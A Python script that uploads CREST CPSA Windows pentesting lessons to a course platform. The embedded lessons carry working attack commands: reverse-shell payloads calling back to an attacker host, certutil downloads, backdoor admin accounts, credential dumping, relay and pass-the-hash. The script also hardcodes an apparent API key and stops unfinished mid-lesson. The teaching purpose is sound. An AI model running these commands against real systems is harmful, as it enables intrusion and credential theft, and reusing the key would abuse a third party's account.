"""
Module E - CourseStack Push Script v3
Lessons and labs aligned by syllabus number.
Each theory lesson sits immediately before its matching lab.

Structure:
  Chapter 1: Module E - Windows Security Assessment (theory lessons)
  Chapter 2: Module E - Labs (iframe labs)

Lesson/Lab alignment:
  E-01 theory  ->  Lab E1-A: SMB Enumeration
  E-02 theory  ->  Lab E2-A: Credential Access
  E-03 theory  ->  Lab E3-A: Windows PrivEsc
  E-03b theory ->  Lab E3-B: ACLs and Permissions
  E-04a theory ->  Lab E4-A: AD Enumeration
  E-04b theory ->  Lab E4-B: Password Policy and Spraying
  E-05a theory ->  Lab E5-A: Kerberos Attacks
  E-05b theory ->  Lab E5-B: SAM Dump and Cached Creds
  E-06 theory  ->  Lab E6-A: SQL Server Exploitation
  E-07 theory  ->  Lab E7-A: Patch Assessment and WSUS
  E-08 theory  ->  Lab E8-A: BloodHound and Attack Path Analysis

Run on Windows:
    python push_module_e_coursestack_v3.py
"""

import requests
from requests.auth import HTTPBasicAuth
import uuid
import time

API_KEY   = "sk_5e9fde21e45324530a735286f8e28bcecf3e9df298ab37ec016833ed57c4f2e52b215010e457e6f3de80c070d3161ff5"
BASE      = "https://app.coursestack.com"
COURSE_ID = "b9d920c3-4a8e-4227-af24-3c5f32fc7350"
auth      = HTTPBasicAuth(API_KEY, "")
HEADERS   = {"Content-Type": "application/json"}
GITHUB    = "https://heaps1345.github.io/mca-activites/cpsa/module-e"


def uid():
    return str(uuid.uuid4()).replace("-", "")


def api_post(path, payload):
    url = f"{BASE}{path}"
    r = requests.post(url, auth=auth, headers=HEADERS, json=payload, timeout=20)
    try:
        data = r.json()
    except Exception:
        data = {}
    if not r.ok:
        print(f"  ERROR {r.status_code}: {r.text[:300]}")
    return r.status_code, data


def create_chapter(name, description=""):
    print(f"\n[chapter] {name}")
    status, data = api_post(
        f"/api/content/{COURSE_ID}/chapters",
        {"name": name, "description": description}
    )
    chapter_id = None
    if isinstance(data, dict):
        chapter_id = (data.get("chapter") or data.get("data") or data).get("id") or data.get("id")
    print(f"  status={status}  chapter_id={chapter_id}")
    return chapter_id


def create_lesson(chapter_id, name):
    print(f"  [lesson] {name}")
    payload = {"name": name, "chapter_id": chapter_id, "type": "lesson"}
    status, data = api_post(f"/api/content/{COURSE_ID}/lessons", payload)
    lesson_obj = data.get("lesson") or data.get("data") or data
    if isinstance(lesson_obj, dict):
        lesson_id = lesson_obj.get("id")
    else:
        lesson_id = None
    if not lesson_id:
        lesson_id = data.get("id")
    print(f"    status={status}  lesson_id={lesson_id}")
    return lesson_id


def push_content(lesson_id, items):
    status, data = api_post(
        f"/api/content/{COURSE_ID}/lessons/{lesson_id}",
        {"content": {"type": "lesson", "id": uid(), "items": items}}
    )
    print(f"    push_content -> {status}")
    return status


def make_text(markdown):
    return {"id": uid(), "type": "text", "markdown": markdown}


def make_iframe(url):
    return {"id": uid(), "type": "iframe", "url": url, "aspect_height": 9, "aspect_width": 16}


# -------------------------------------------------------
# THEORY LESSON CONTENT - aligned to lab syllabus order
# -------------------------------------------------------

E01_MD = """## E-01: SMB Enumeration

SMB (Server Message Block) is Microsoft's file and printer sharing protocol. It runs on port 445 and is present on virtually every Windows host. For a penetration tester it is one of the richest sources of information and one of the most frequently misconfigured services on the network.

### Why SMB Matters

Before you run a single exploit, SMB enumeration tells you:
- What operating system and patch level the target is running
- Whether SMB signing is enforced (if not, NTLM relay attacks are possible)
- What shares are accessible, including to unauthenticated users
- What users and sessions are active (via null session or authenticated queries)
- Whether SMBv1 is enabled (EternalBlue attack surface)

> **Operator mindset:** SMB signing disabled is not just a finding - it is a prerequisite for your NTLM relay attack. Check it on every host before deciding whether to crack captured hashes or relay them.

### Core Enumeration Commands

```bash
# Scan for SMB hosts and version fingerprint
nmap -p 445 --script smb-os-discovery,smb-security-mode,smb2-security-mode TARGET_RANGE

# Check SMB signing status (key for relay decision)
nmap --script smb-security-mode -p 445 TARGET
crackmapexec smb TARGET_RANGE

# Null session - unauthenticated enumeration
smbclient -L //TARGET -N
enum4linux -a TARGET
enum4linux-ng -A TARGET

# Authenticated share enumeration
smbclient -L //TARGET -U jsmith%Password1
crackmapexec smb TARGET -u jsmith -p Password1 --shares
```

### SMB Signing - The Relay Decision

| Signing Status | What It Means | Attack |
|---------------|--------------|--------|
| Required | All SMB traffic is signed and verified | Relay blocked - must crack captured hashes |
| Enabled (not required) | Signing is available but not enforced | Relay possible |
| Disabled | No signing at all | Relay possible - preferred target |

```bash
# crackmapexec output - look for "signing:False"
crackmapexec smb 192.168.1.0/24
# SMB  192.168.1.5  445  SYNTEX-DC01  [*] signing:True  (domain: syntex.local)
# SMB  192.168.1.10 445  SYNTEX-WS01  [*] signing:False (domain: syntex.local)
```

### Share Hunting

Shares are where real data lives. Anonymous read access to business shares is a HIGH finding on every engagement.

```bash
# Check for readable shares - authenticated
crackmapexec smb TARGET -u jsmith -p Password1 --shares

# Spider shares for sensitive content
crackmapexec smb TARGET -u jsmith -p Password1 -M spider_plus

# Manual browsing
smbclient //TARGET/FINANCE -U jsmith%Password1
```

> ★ **CREST CPSA:** Know the difference between SMBv1 and SMBv2/v3. SMBv1 is the EternalBlue attack surface (MS17-010). SMB signing disabled means NTLM relay is viable. Both are HIGH findings and both are present in many production environments.
"""

E02_MD = """## E-02: Credential Access

Credential access is the pivot point of every Windows engagement. Once you hold credentials - whether a cleartext password, an NT hash, or a Kerberos ticket - your attack options multiply exponentially. This lesson covers the three primary paths to credential capture from a network position.

### The Three Paths

| Method | What You Capture | Requires | Next Step |
|--------|-----------------|----------|-----------|
| **Responder** | NetNTLMv2 hash | Network position, LLMNR/NBT-NS active | Crack (mode 5600) or relay |
| **NTLM Relay** | Authenticated session | SMB signing disabled | Direct code execution |
| **Kerberoasting** | TGS ticket hash | Valid domain account | Crack offline (mode 13100) |

### Path 1: Responder - Passive Hash Capture

LLMNR (Link-Local Multicast Name Resolution) and NBT-NS (NetBIOS Name Service) are Windows fallback protocols. When DNS fails to resolve a name, Windows broadcasts the query to the local network. Responder answers: "That's me - authenticate." Windows authenticates, sending a NetNTLMv2 hash.

```bash
# Start Responder - listen and poison
sudo responder -I eth0 -wPv

# Hashes appear in terminal and are saved to:
/usr/share/responder/logs/

# Crack captured hashes
hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt
```

> **Critical distinction:** NetNTLMv2 hashes CANNOT be passed. They must be cracked or relayed. NT hashes (from Mimikatz or secretsdump) CAN be passed directly.

### Path 2: NTLM Relay - Skip the Cracking

If SMB signing is disabled on target servers, relay the captured NetNTLMv2 credential directly to those servers. The victim authenticates to you, you forward the authentication to the target. If the victim is a local admin on the target, you get code execution - no password required.

```bash
# Step 1: Disable SMB in /etc/responder/Responder.conf
# SMB = Off
# HTTP = Off

# Step 2: Start ntlmrelayx targeting hosts without SMB signing
ntlmrelayx.py -tf targets.txt -smb2support

# Step 3: Start Responder to capture and forward
sudo responder -I eth0 -wPv

# When a victim authenticates: ntlmrelayx executes on the target
# With -i flag: drops an interactive shell
# Default: dumps SAM database from target
```

### Path 3: Kerberoasting - Offline Service Account Attack

Any authenticated domain user can request a Kerberos service ticket (TGS) for any account with a registered Service Principal Name (SPN). That ticket is encrypted with the service account's NT hash. Take it offline and crack it.

```bash
# Request all available TGS tickets
GetUserSPNs.py syntex.local/jsmith:Password1 -dc-ip <DC01-IP> -request -outputfile kerberoast.txt

# Crack with Hashcat
hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt --force
```

> ★ **CREST CPSA:** Three hash types, three Hashcat modes: NT hash = mode 1000 (can be passed). NetNTLMv2 = mode 5600 (must crack or relay). Kerberos TGS = mode 13100 (crack offline). Know these cold - they come up in every Windows scenario question.
"""

E03_MD = """## E-03: Windows Privilege Escalation

Local privilege escalation is the step between a foothold and full domain access. You have a low-privilege shell on a Windows machine. Your objective is SYSTEM. These are the techniques that appear consistently in real environments and in the CREST CPSA exam.

### The Enumeration-First Mindset

Never guess at a privesc technique. Run WinPEAS first, read all of it, then choose the path the evidence supports. An unverified technique wastes time and may be detected. WinPEAS takes 60 seconds - read it.

```bash
# Transfer WinPEAS to target
# On Kali: serve it
python3 -m http.server 8080

# On target (cmd or Evil-WinRM shell)
certutil -urlcache -split -f http://<KALI-IP>:8080/winPEASx64.exe winpeas.exe
.\winpeas.exe
```

### Technique 1: Unquoted Service Paths

When a Windows service binary path contains spaces and is not enclosed in quotes, Windows resolves it ambiguously. It tries each space-separated segment as a potential binary path, in order. An attacker who can write to any of those intermediate directories can plant a binary that Windows executes as SYSTEM when the service starts.

```
# Vulnerable path:
C:\Program Files\Syntex Solutions\Backup\SyntexBackup.exe

# Windows tries in order:
C:\Program.exe                              <- attacker plants here if writable
C:\Program Files\Syntex.exe                <- or here
C:\Program Files\Syntex Solutions\Backup\SyntexBackup.exe
```

```bash
# Verify the vulnerability
sc qc SyntexBackup

# Check write permissions on intermediate directories
icacls "C:\Program Files\Syntex Solutions"

# Generate payload and plant it
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<KALI-IP> LPORT=4444 -f exe -o Syntex.exe
copy Syntex.exe "C:\Program Files\Syntex Solutions\Syntex.exe"

# Restart the service to trigger execution
sc stop SyntexBackup && sc start SyntexBackup
```

### Technique 2: AlwaysInstallElevated

A Group Policy setting that allows any user to install MSI packages with SYSTEM privileges. Both registry keys must be set to 1 for the attack to work.

```bash
# Verify both keys (both must be 0x1)
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# Generate malicious MSI
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<KALI-IP> LPORT=4445 -f msi -o evil.msi

# Install it - runs as SYSTEM due to the policy
msiexec /quiet /qn /i evil.msi
```

> **CPSA exam trap:** If only HKCU or only HKLM is set to 1, the attack does not work. Both keys must be set. WinPEAS checks both automatically and flags when vulnerable.

### Technique 3: Weak Service Binary Permissions

If an authenticated user can overwrite or replace a service binary, they can substitute their own payload. When the service restarts, their code runs under the service account's privileges.

```bash
# Find services with weak binary permissions
.\winpeas.exe | findstr "Everyone\|BUILTIN\\Users.*:.*W"

# Verify with icacls
icacls "C:\Program Files\SyntexMonitor\monitor.exe"

# Replace binary with payload, restart service
```

### After SYSTEM: Dump Everything

The moment you reach SYSTEM, dump LSASS. Every credential currently in memory becomes a lateral movement opportunity.

```bash
# Mimikatz - dump all logon passwords and hashes
sekurlsa::logonpasswords

# DCSync - dump all domain hashes without touching LSASS
lsadump::dcsync /domain:syntex.local /all /csv
```

> ★ **CREST CPSA:** AlwaysInstallElevated is a HIGH finding because it requires no vulnerability in any software - it is a deliberate policy misconfiguration that grants any user SYSTEM access. Always check for it. Always report it. AlwaysInstallElevated = BOTH keys set to 1.
"""

E03B_MD = """## E-03b: ACLs, Registry and File Permissions

Windows uses Access Control Lists to define who can do what to every object in the operating system - files, registry keys, services, AD objects. Misconfigurations in ACLs are some of the most common and most impactful findings on Windows engagements, because they grant privilege escalation without exploiting any vulnerability.

### Why ACLs Matter

An ACL misconfiguration is not a software bug. It is a permission setting that an administrator deliberately (or accidentally) set incorrectly. Exploiting it requires no exploit code - just the right command. This makes ACL findings particularly impactful: they cannot be patched away, only reconfigured.

### Windows Permission Flags

| Flag | Meaning | Attack Potential |
|------|---------|-----------------|
| **(F)** | Full Control | Complete ownership - read, write, delete, change permissions |
| **(W)** | Write | Write to file/directory - plant malicious content |
| **(RX)** | Read and Execute | Limited - view and run, but not modify |
| **(OI)(CI)** | Object/Container Inherit | Permissions propagate to all children |

### Weak File and Directory Permissions

```bash
# Find world-writable files in Program Files (common misconfiguration)
icacls "C:\Program Files" /T 2>nul | findstr "Everyone.*:(W\|F\|M)"

# Find world-writable scheduled task scripts
icacls C:\Scripts\ /T | findstr "Everyone\|BUILTIN\\Users"

# Check specific service binary
icacls "C:\Program Files\SyntexMonitor\monitor.exe"
```

### Weak Registry Key Permissions

Registry keys control service configurations, autorun entries, and system settings. Write access to the wrong key enables privilege escalation.

```bash
# Check service registry key permissions
Get-Acl "HKLM:\System\CurrentControlSet\Services\SyntexMonitor" | Format-List

# Find registry keys writable by standard users
subinacl /keyreg HKLM\SYSTEM\CurrentControlSet\Services /display

# AlwaysInstallElevated check (always manual verify)
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

### Scheduled Task Script Hijacking

If a scheduled task runs as SYSTEM and executes a script file that any user can overwrite, the attack is trivial - replace the script content with a payload and wait for the task to fire.

```bash
# Enumerate scheduled tasks
schtasks /query /fo LIST /v | findstr /i "task\|run as\|task to run"

# Check script file permissions
icacls C:\Scripts\maintenance.ps1
# C:\Scripts\maintenance.ps1 Everyone:(F)  <-- world-writable, critical finding

# Overwrite with reverse shell
$payload = 'powershell -nop -w hidden -e <BASE64_ENCODED_SHELL>'
Set-Content C:\Scripts\maintenance.ps1 $payload
```

### AD Object ACLs - The BloodHound Connection

ACL misconfigurations are not limited to the local file system. Active Directory objects - users, groups, OUs, the domain object itself - all have ACLs. A user with WriteDACL on the Domain object can grant themselves DCSync rights. A user with GenericWrite on a group can add themselves as a member.

BloodHound maps all of these edges automatically. Always check the "Outbound Object Control" panel on any user node you control - it shows every AD object your account has write permissions on.

> ★ **CREST CPSA:** Report world-writable scheduled task scripts as CRITICAL if the task runs as SYSTEM. The attack requires no tools - just `Set-Content`. Always document the full chain: writable script + task runs as SYSTEM = instant SYSTEM shell.
"""

E04A_MD = """## E-04a: Active Directory Enumeration

Active Directory enumeration is the reconnaissance phase of every Windows domain engagement. The goal is to understand the terrain completely before choosing an attack path. Good enumeration means you never make a move without knowing exactly what it will give you.

### What You Are Looking For

| Target | Why |
|--------|-----|
| **Domain Controllers** | The prize and the authentication authority. All attacks ultimately target or pass through the DC. |
| **Domain Admins** | Who has the keys? Where are they logged in right now? |
| **Service Accounts** | SPNs = Kerberoastable. Often have elevated privileges and weak passwords. |
| **ACL Misconfigurations** | GenericWrite, WriteDACL, ForceChangePassword on privileged objects. |
| **Active Sessions** | Where privileged users are logged in. Lateral movement to those hosts. |
| **Group Policy** | Weak settings, AlwaysInstallElevated, script paths, password policies. |

### Core Enumeration Commands

```bash
# Authenticated LDAP enumeration - all users with descriptions
ldapsearch -x -H ldap://<DC01-IP> -D "jsmith@syntex.local" -w Password1 \
  -b "DC=syntex,DC=local" "(objectClass=user)" sAMAccountName description

# Find all SPNs (Kerberoastable accounts)
ldapsearch -x -H ldap://<DC01-IP> -D "jsmith@syntex.local" -w Password1 \
  -b "DC=syntex,DC=local" "(servicePrincipalName=*)" sAMAccountName servicePrincipalName

# Enumerate with enum4linux-ng (covers SMB, LDAP, RPC in one pass)
enum4linux-ng -A -u jsmith -p Password1 <DC01-IP>

# CrackMapExec - fast authenticated enumeration
crackmapexec smb <DC01-IP> -u jsmith -p Password1 --users
crackmapexec smb <DC01-IP> -u jsmith -p Password1 --groups
crackmapexec smb <DC01-IP> -u jsmith -p Password1 --sessions
```

### Password Hunting in Descriptions

Administrators frequently store temporary passwords in the Description field of user accounts. This is a consistent HIGH finding across real engagements.

```bash
# Query all user descriptions - look for anything that looks like a password
ldapsearch -x -H ldap://<DC01-IP> -D "jsmith@syntex.local" -w Password1 \
  -b "DC=syntex,DC=local" "(objectClass=user)" sAMAccountName description \
  | grep -A1 "description:"

# CrackMapExec also shows descriptions
crackmapexec smb <DC01-IP> -u jsmith -p Password1 --users
```

### PowerView - Windows-Side Enumeration

If you have a Windows shell, PowerView gives you the most comprehensive AD enumeration available.

```powershell
# Load PowerView
. .\PowerView.ps1

# Core enumeration
Get-DomainUser -Properties samaccountname,description,memberof
Get-DomainGroup "Domain Admins" -Recurse
Get-DomainComputer -Properties name,operatingsystem
Get-DomainGPO | select displayname,gpcfilesyspath

# Find where Domain Admins are logged in right now
Find-DomainUserLocation -GroupName "Domain Admins"

# ACL hunting - find objects where jsmith has write permissions
Find-InterestingDomainAcl -ResolveGUIDs | Where-Object {$_.IdentityReference -like "*jsmith*"}
```

> ★ **CREST CPSA:** Always check the Description field on every user account - passwords stored there is a real-world finding that appears in actual exam scenarios. And always run Find-DomainUserLocation before planning lateral movement - it tells you exactly where to go next.
"""

E04B_MD = """## E-04b: Password Policy and Password Spraying

Password policy defines the minimum security bar for every account in the domain. A weak policy means weak passwords. A weak password means your spray works. Understanding the policy before you spray is not optional - spraying without knowing the lockout threshold will lock accounts and get you caught.

### Reading the Password Policy

```bash
# From Kali - no credentials needed if null sessions are allowed
enum4linux -P <DC01-IP>

# Authenticated
crackmapexec smb <DC01-IP> -u jsmith -p Password1 --pass-pol

# Output to look for:
# Minimum password length: 7          <- low bar
# Password history length: 0          <- passwords can be reused
# Account lockout threshold: 5        <- can spray 4 attempts safely
# Lockout duration: 30 mins           <- reset window
# Lockout observation window: 30 mins
```

### Fine-Grained Password Policies

Modern domains can have different password policies for different groups. Service accounts may have a 90-day expiry with no complexity requirement. Admin accounts may have a 30-day expiry with MFA. Always check for Fine-Grained Password Policies (PSOs) before spraying.

```powershell
# Check for PSOs (Fine-Grained Password Policies)
Get-ADFineGrainedPasswordPolicy -Filter *
Get-ADUserResultantPasswordPolicy -Identity jsmith
```

### Password Spraying - The Safe Approach

Password spraying tests one password against many accounts, rather than many passwords against one account. It stays under the lockout threshold by design.

```bash
# Rule: never exceed (lockout_threshold - 1) attempts per user
# If threshold is 5: spray maximum 4 passwords then stop and wait

# Spray with CrackMapExec - one password at a time
crackmapexec smb <DC01-IP> -u users.txt -p 'Password1' --continue-on-success

# Common spray candidates for corporate environments
# Season+Year: Summer2024, Autumn2024, Winter2024
# Company name variations: Syntex1, Syntex123, Syntex2024
# Generic: Password1, Welcome1, Passw0rd

# Spray with kerbrute (Kerberos-based - less noisy than NTLM)
kerbrute passwordspray -d syntex.local --dc <DC01-IP> users.txt 'Password1'
```

### Building a User List for Spray

```bash
# Extract all usernames from LDAP
ldapsearch -x -H ldap://<DC01-IP> -D "jsmith@syntex.local" -w Password1 \
  -b "DC=syntex,DC=local" "(objectClass=user)" sAMAccountName \
  | grep sAMAccountName | awk '{print $2}' > users.txt

# Or from enum4linux output
enum4linux -u jsmith -p Password1 -U <DC01-IP> | grep "user:" | awk -F"'" '{print $2}' > users.txt
```

### What a Successful Spray Gives You

- Additional domain credentials for further enumeration
- Potential access to sensitive shares
- A foothold on additional machines where that account has local admin
- More Kerberoasting targets if the account has SPNs

> ★ **CREST CPSA:** Always enumerate the lockout policy BEFORE spraying. Spraying without this knowledge is a red flag in your methodology and will lock accounts in a real engagement. The examiner will ask how you ensured you did not trigger lockouts.
"""

E05A_MD = """## E-05a: Kerberos Attacks - Kerberoasting and AS-REP Roasting

Kerberos is the default authentication protocol for Active Directory. It is also the source of two of the most reliably exploitable attack techniques in the Windows attack chain. Both produce offline-crackable hashes. Both require no special privileges. Both are present in the majority of Active Directory environments.

### How Kerberos Authentication Works

1. Client authenticates to the KDC and receives a **Ticket Granting Ticket (TGT)** - proof of identity
2. Client presents the TGT to request a **Service Ticket (TGS)** for a specific service
3. The TGS is encrypted with the **service account's NT hash** - this is the Kerberoasting target
4. Client presents the TGS to the service to authenticate

Step 3 is the attack surface. Any authenticated domain user can request a TGS for any service, and the encryption uses the service account's password hash.

### Kerberoasting

**What it targets:** Any account with a registered Service Principal Name (SPN).

**Why it works:** The TGS is encrypted with the service account's NT hash. Take the ticket offline and crack it. No interaction with the target service required after the ticket is issued.

**Who is affected:** Service accounts running IIS, SQL Server, backup agents, monitoring tools - anything that registers an SPN in AD.

```bash
# Enumerate and request all TGS tickets in one step
GetUserSPNs.py syntex.local/jsmith:Password1 -dc-ip <DC01-IP> -request -outputfile kerberoast.txt

# Review what you got
cat kerberoast.txt
# $krb5tgs$23$*svc-sql$SYNTEX.LOCAL$...  <- this is the crackable hash

# Crack with Hashcat - mode 13100
hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt
hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

### AS-REP Roasting

**What it targets:** Accounts with "Do not require Kerberos preauthentication" enabled.

**Why it works:** Normally, a client must prove knowledge of their password to request a TGT (preauthentication). When preauthentication is disabled, the KDC returns a TGT encrypted with the account's password hash - to anyone who asks. No credentials required.

**Who is affected:** Accounts where an admin has disabled preauthentication (sometimes done for compatibility with older software).

```bash
# No credentials needed - try this first when you have no domain access
GetNPUsers.py syntex.local/ -usersfile users.txt -dc-ip <DC01-IP> -no-pass -format hashcat -outputfile asrep.txt

# With credentials - enumerate targets automatically
GetNPUsers.py syntex.local/jsmith:Password1 -dc-ip <DC01-IP> -format hashcat -outputfile asrep.txt

# Crack with Hashcat - mode 18200
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt
```

### Side-by-Side Comparison

| | Kerberoasting | AS-REP Roasting |
|--|--------------|-----------------|
| Credentials required | Yes - any domain account | **No - unauthenticated** |
| Target | Accounts with SPNs | Accounts with preauth disabled |
| Hash type | TGS-REP | AS-REP |
| Hashcat mode | **13100** | **18200** |
| Tool | GetUserSPNs.py | GetNPUsers.py |

> ★ **CREST CPSA:** AS-REP Roasting requires NO credentials. Always attempt it before you have any domain access - you might get credentials that let you enumerate further. Memorise: Kerberoasting = 13100 (GetUserSPNs.py), AS-REP = 18200 (GetNPUsers.py). These modes appear in exam questions directly.
"""

E05B_MD = """## E-05b: SAM Database, Cached Credentials and DCC2

Once you have SYSTEM on a Windows machine, multiple credential stores become available. Understanding what each one contains and what you can do with the hashes it yields is essential - not all hashes are equal.

### The Three Credential Stores

| Store | Location | Contains | Hashcat Mode | Can Pass? |
|-------|---------|---------|--------------|-----------|
| **SAM** | `SYSTEM` hive + `SAM` hive | Local account NT hashes | 1000 | Yes |
| **LSASS** | Memory (lsass.exe) | NT hashes, plaintext (if WDigest), Kerberos tickets | 1000 | Yes |
| **DCC2** | `SECURITY` hive | Cached domain credentials | 2100 | **No** |

### SAM Database - Local Account Hashes

The SAM database stores NT hashes for all local accounts. Dumping it gives you local Administrator and any other local accounts - useful for lateral movement to machines sharing the same local admin password.

```bash
# From Kali with SYSTEM credentials - secretsdump
secretsdump.py syntex.local/administrator:<NTHASH>@<TARGET-IP> -hashes :<NTHASH>

# Or dump locally if you have SYSTEM shell
reg save HKLM\SAM C:\sam.bak
reg save HKLM\SYSTEM C:\system.bak
secretsdump.py -sam C:\sam.bak -system C:\system.bak LOCAL
```

### LSASS - The Gold Mine

LSASS (Local Security Authority Subsystem Service) holds every credential for every active logon session. This is the primary target post-SYSTEM.

```bash
# Mimikatz - dump all active sessions
sekurlsa::logonpasswords

# Output includes:
# Username: administrator
# Domain: SYNTEX
# NTLM: aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba88547376818d4
# <- NT hash on the right of the colon - this is what you pass

# From Kali using CrackMapExec
crackmapexec smb <TARGET-IP> -u administrator -H <NTHASH> --lsa
```

### DCC2 - Cached Domain Credentials

Domain Cached Credentials (DCC2) allow domain users to log in when the DC is unreachable. Windows stores the last 10 domain logons by default. The hash format is DCC2 - it is derived from the NT hash and the username, and it is computationally expensive to crack.

```bash
# Dump cached credentials (requires SYSTEM)
secretsdump.py -security SECURITY -system SYSTEM LOCAL

# DCC2 hash format:
# $DCC2$10240#username#hashhashhashhash

# Crack with Hashcat - mode 2100 (very slow)
hashcat -m 2100 dcc2.txt /usr/share/wordlists/rockyou.txt

# DCC2 hashes CANNOT be passed - they must be cracked
```

### The Pass-the-Hash Attack

NT hashes from SAM or LSASS can be used directly for authentication without cracking the password.

```bash
# Evil-WinRM with NT hash
evil-winrm -i <TARGET-IP> -u administrator -H <NTHASH>

# CrackMapExec - spray NT hash across subnet
crackmapexec smb 192.168.1.0/24 -u administrator -H <NTHASH>

# Impacket psexec
impacket-psexec syntex.local/administrator@<TARGET-IP> -hashes :<NTHASH>
```

> ★ **CREST CPSA:** DCC2 cannot be passed - this is a guaranteed exam question. NT hashes can be passed. NetNTLMv2 hashes cannot be passed (they must be cracked or relayed). Know the three hash types and what you can do with each one. Mode 2100 for DCC2, mode 1000 for NT hashes, mode 5600 for NetNTLMv2.
"""

E06_MD = """## E-06: SQL Server Exploitation

SQL Server is a common presence on Windows networks, particularly in environments running line-of-business applications. A misconfigured SQL Server instance is not just a database finding - it is often a direct path to SYSTEM on the host and lateral movement across the network.

### Why SQL Server Matters for Pentesters

SQL Server runs as a Windows service. In many environments it runs as `NT AUTHORITY\SYSTEM` or under a domain service account with elevated privileges. The `xp_cmdshell` stored procedure - when enabled - executes operating system commands directly from SQL queries. Database compromise = OS compromise.

### Discovery and Authentication

```bash
# Discover SQL Server instances on the network
nmap -p 1433 --script ms-sql-info,ms-sql-empty-password 192.168.1.0/24

# Brute force with crackmapexec
crackmapexec mssql <TARGET-IP> -u sa -p passwords.txt

# Default credentials to always try first
# sa / (blank)
# sa / sa
# sa / password
# sa / Password1
# sa / Syntex2024!
```

### Exploitation via xp_cmdshell

`xp_cmdshell` is disabled by default in modern SQL Server versions, but administrators frequently re-enable it for maintenance scripts. Once authenticated as `sa` or any account with `sysadmin` role:

```sql
-- Enable xp_cmdshell if disabled
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;

-- Execute OS commands as the SQL Server service account
EXEC xp_cmdshell 'whoami';
-- Output: nt authority\system  (if running as SYSTEM)

-- Add a local admin account
EXEC xp_cmdshell 'net user hacker Hacker123! /add && net localgroup administrators hacker /add';

-- Reverse shell via PowerShell
EXEC xp_cmdshell 'powershell -nop -w hidden -e <BASE64_SHELL>';
```

### Impacket mssqlclient

```bash
# Connect to SQL Server from Kali
mssqlclient.py syntex.local/sa:Syntex2024!@<TARGET-IP> -windows-auth

# Once connected - enable and use xp_cmdshell
SQL> enable_xp_cmdshell
SQL> xp_cmdshell whoami
SQL> xp_cmdshell "net user"
```

### Linked Servers - Lateral Movement via SQL

SQL Server supports "linked servers" - trusted connections between SQL instances on different machines. Compromise one SQL instance and you may have query access to SQL instances on other hosts, potentially in different network segments.

```sql
-- Enumerate linked servers
SELECT * FROM sys.servers WHERE is_linked = 1;

-- Execute commands on a linked server
EXEC ('xp_cmdshell ''whoami''') AT [LINKED-SERVER-NAME];
```

### Credential Extraction from SQL

SQL Server stores credentials for linked server connections and proxy accounts.

```sql
-- List SQL logins and password hashes
SELECT name, password_hash FROM sys.sql_logins;

-- Crack SQL Server hashes with Hashcat
hashcat -m 1731 sql_hashes.txt wordlist.txt
```

> ★ **CREST CPSA:** xp_cmdshell enabled on a SQL Server running as SYSTEM is a CRITICAL finding - it is a one-command SYSTEM shell. Always check the service account context first (`xp_cmdshell 'whoami'`) - the OS privileges you gain depend entirely on what the SQL service is running as.
"""

E07_MD = """## E-07: Patch Level Assessment and WSUS

Patch level assessment tells you whether the target is vulnerable to known public exploits. A single unpatched critical vulnerability on a Domain Controller can mean instant domain compromise. WSUS (Windows Server Update Services) misconfigurations can turn the patching infrastructure itself into an attack vector.

### Why Patch Assessment Matters

Unpatched systems are not just a theoretical risk. EternalBlue (MS17-010) still appears on internal penetration tests in 2024 - years after the WannaCry outbreak. PrintNightmare (CVE-2021-34527) was exploited in production environments for months after disclosure. Patch assessment is not a compliance checkbox; it is a live attack surface.

### Enumerating Patch Level

```bash
# From Kali - nmap scripts for vulnerability scanning
nmap -p 445 --script smb-vuln-ms17-010 <TARGET-IP>
nmap -p 445 --script smb-vuln-ms08-067 <TARGET-IP>
nmap --script smb-vuln* -p 445 <TARGET-IP>

# Check installed patches from a Windows shell
wmic qfe list full /format:table
Get-HotFix | Sort-Object InstalledOn -Descending

# Check specific KB
Get-HotFix -Id KB5004945  # PrintNightmare patch
Get-HotFix -Id KB4012212  # MS17-010 patch
```

### Key Vulnerabilities to Check

| CVE | KB Patch | Impact | Check |
|-----|---------|--------|-------|
| MS17-010 (EternalBlue) | KB4012212 | Remote SYSTEM via SMBv1 | `nmap --script smb-vuln-ms17-010` |
| PrintNightmare (CVE-2021-34527) | KB5004945 | SYSTEM via Print Spooler | Check if Print Spooler is running |
| ZeroLogon (CVE-2020-1472) | KB4571694 | DC takeover with no credentials | `zerologon_tester.py` |
| PetitPotam (CVE-2021-36942) | KB5005413 | Coerce DC auth for relay | Check if EFS RPC enabled |

### WSUS Attack - Poisoning the Update Server

WSUS delivers Windows Updates to domain-joined machines. If WSUS uses HTTP (not HTTPS) for client communication, an attacker with a network position can intercept update requests and inject malicious "updates" that execute with SYSTEM privileges.

```bash
# Check if WSUS is in use and whether it uses HTTP
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate
# WUServer = http://wsus.syntex.local:8530  <- HTTP = vulnerable
# WUServer = https://wsus.syntex.local:8531 <- HTTPS = protected

# PyWSUS - inject a malicious WSUS update
# (requires a man-in-the-middle network position)
git clone https://github.com/GoSecure/pywsus
python pywsus.py -H <WSUS-IP> -p 8530 -e PsExec.exe -c "net user hacker Hacker123! /add"

# Combine with ARP spoofing to intercept WSUS traffic
arpspoof -i eth0 -t <TARGET-IP> <WSUS-IP>
```

### Reporting Patch Findings

Patch findings should always include:
1. **CVE reference** - not just the KB number
2. **Exploit availability** - is public PoC code available?
3. **Exploitability** - authenticated or unauthenticated? Network or local?
4. **Evidence** - output of the nmap script or patch query
5. **Remediation** - specific KB to apply, not just "apply patches"

